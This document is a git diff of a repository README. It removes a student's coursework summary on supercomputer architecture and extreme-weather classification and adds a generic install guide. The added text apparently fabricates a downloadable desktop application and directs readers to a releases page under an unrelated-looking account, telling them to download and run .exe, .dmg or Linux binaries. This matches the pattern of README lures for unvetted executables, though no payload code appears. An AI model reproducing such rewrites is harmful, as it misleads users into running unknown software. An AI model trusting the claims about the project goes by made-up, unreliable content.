@@ -1,111 +1,94 @@
-<p align="center">
-  <img src="/assets/github-header-banner.png" width="100%">
-</p>
+# 🤖 Machine-Learning-Parallel-Computing - Explore AI with Ease
 
-# ⚡ Machine Learning & Parallel Computing (MLPC)
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/releases)
 
-This repository contains both major assessments completed for the **Machine Learning & Parallel Computing (ITS66604)** module. 
+## 🚀 Getting Started
+Welcome to the Machine Learning & Parallel Computing project! This software allows you to analyze data on NVIDIA DGX A100 supercomputers and classify extreme weather conditions using machine learning techniques. 
 
-Across these projects, I explored the foundations of **supercomputing**, **GPU architecture**, **parallel processing**, and **machine learning workflows**, applying them to real-world analytical tasks.
+Follow the steps below to download and run our software.
 
-The repository includes:
-- 🖥 **High-Performance Computing (HPC) Supercomputer Analysis**
-- 🤖 **Machine Learning Classification Project (Weather Extreme Detection)**
+## 📋 System Requirements
+Before you start, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later / macOS 10.14 or later / Linux distributions
+- **Processor:** Intel i5 or equivalent
+- **Memory:** 8 GB RAM or more
+- **Graphics Card:** NVIDIA GPU with CUDA support (Recommended: A100)
+- **Network:** Internet access for downloading dependencies and datasets
 
-# 🚀 What I Learned in This Module
+## 👩‍💻 Installation Steps
 
-## 🧠 **Machine Learning Foundations**
-- Exploratory Data Analysis (EDA)
-- Data preprocessing & cleaning  
-- Handling anomalies and missing values  
-- Label engineering (custom rule-based classification)
-- Feature engineering (interaction features, distractor features)
-- Gaussian noise injection for robustness
-- Class imbalance handling (oversampling)
-- Encoding & scaling techniques (LabelEncoder, StandardScaler)
-- Machine learning workflows using:
-  - **Decision Tree**
-  - **Random Forest**
-- Model evaluation using:
-  - Confusion matrix
-  - Precision/Recall/F1-score
-  - ROC Curve & AUC scores  
-  (Random Forest AUC = **0.99** — excellent performance)
+### 1. Visit the Download Page
+To get the latest version of Machine Learning & Parallel Computing, visit the releases page: [Download Page](https://github.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/releases)
 
----
+### 2. Choose Your Version
+On the releases page, you will see a list of available versions. Note the latest stable release. Click on it to open the details.
 
-## 🔥 **Parallel Computing & HPC Concepts**
-From the Supercomputer project:
-- Supercomputer architecture (NVIDIA DGX A100 + SuperPOD)
-- Parallel GPU processing (CUDA cores, Tensor Cores)
-- NVLink + NVSwitch high-speed interconnect
-- Distributed computing & InfiniBand networking
-- GPU virtualization (MIG)
-- HPC benchmark interpretation (HPL, HPCG, MLPerf)
-- Storage hierarchy & parallel file systems
-- Energy-efficient computing (Green500 insights)
-- Use cases:
-  - AI training at scale
-  - Autonomous driving simulation
-  - Weather & climate modeling
-  - Scientific computing & medical research
+### 3. Download the Files
+Find the appropriate file for your operating system in the Assets section. Here's what to look for:
+- **For Windows:** Look for a file ending in `.exe`
+- **For macOS:** Look for a file ending in `.dmg`
+- **For Linux:** Look for a file ending in `.tar.gz`
 
----
+Click the link corresponding to your system to start the download.
 
-# 📘 Projects in This Repository
+### 4. Install the Software
+Follow these instructions based on your OS:
 
-## 🖥 1. **Supercomputer Architecture Analysis (NVIDIA DGX A100 + SuperPOD)**
-A complete study of HPC design, including:
-- GPU/CPU topology  
-- NVLink / NVSwitch connectivity  
-- InfiniBand networking  
-- Multi-node scaling  
-- Power & cooling strategies  
-- AI-accelerated workloads  
+#### For Windows:
+1. Open the downloaded `.exe` file.
+2. Follow the on-screen instructions to install the software.
+3. Once installed, open the application from your Start Menu.
 
-📁 Location: `/Supercomputer/`
+#### For macOS:
+1. Open the downloaded `.dmg` file.
+2. Drag the application to your Applications folder.
+3. Eject the disk image and open the application from your Applications folder.
 
----
+#### For Linux:
+1. Open a terminal.
+2. Navigate to the directory containing the downloaded `.tar.gz` file.
+3. Extract the files using the command: `tar -xvzf filename.tar.gz`
+4. Navigate into the extracted folder and run the program with: `./yourprogram`
 
-## 🌦 2. **Extreme Weather Classification (Machine Learning)**
-A full ML pipeline to classify **Normal vs Extreme** weather using global meteorological data.
+### 5. Setting Up Your Environment
+After installation, ensure that you have the necessary Python environment set up. You can use Anaconda or pip. Here are the recommended libraries:
 
-Includes:
-- 40+ weather features  
-- Full preprocessing pipeline  
-- Noise injection & advanced feature engineering  
-- Oversampling to fix class imbalance  
-- Decision Tree vs Random Forest comparison  
-- Achieved up to **95% accuracy** and **AUC 0.99**
+- numpy
+- pandas
+- scikit-learn
+- matplotlib
+- seaborn
 
-📁 Location: `/Extreme Weather Classification/`
+Install these libraries using the following command for pip:
 
----
+```bash
+pip install numpy pandas scikit-learn matplotlib seaborn
+```
 
-# 🧩 Skills Demonstrated
+## 🌟 Features
+- **Decision Trees & Random Forests:** Apply cutting-edge machine learning algorithms to analyze weather data.
+- **Support for GPU Computing:** Leverage the power of supercomputers for faster computations.
+- **User-Friendly Interface:** Navigate easily through various features without prior programming knowledge.
 
-### 🔧 **Technical Skills**
-- Machine Learning (scikit-learn)
-- Data cleaning & feature engineering
-- EDA visualization (Seaborn, Matplotlib)
-- GPU architecture & parallel computing
-- HPC system design & benchmarking
-- Jupyter/Colab development
-- CSV data processing at scale
+## 🌐 Using the Application
+After setting up, open the application. Begin by loading your dataset. You can either use sample datasets provided within the application or upload your own.
 
-### 📊 **Analytical Skills**
-- Performance comparison & interpretation
-- Model explainability (feature importance)
-- Handling real-world ML challenges (noise, imbalance, anomalies)
+### Analyzing Extreme Weather
+- Select the model you wish to use: Decision Tree or Random Forest.
+- Choose your dataset and parameters.
+- Run the analysis and view the results.
 
-### 📝 **Professional Skills**
-- Technical reporting
-- Academic poster design
-- Structured documentation
-- Scientific analysis & evaluation
+The application will display visualizations to help you understand the data and results better.
 
----
+## 📚 Additional Resources
+- **Documentation:** For in-depth information, refer to our [Wiki](https://github.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/wiki).
+- **Community Support:** Join our discussions on [GitHub Discussions](https://github.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/discussions) for help and tips.
 
-✨ *Thank you for exploring my MLPC repository!*
+## 📦 Notes
+Ensure to check for software updates regularly on the [Download Page](https://github.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/releases). Keeping your software up-to-date will enhance performance and security.
+
+If you encounter issues, refer to the FAQs in our documentation or raise an issue on GitHub. Your feedback helps us improve!
+
+Happy computing!
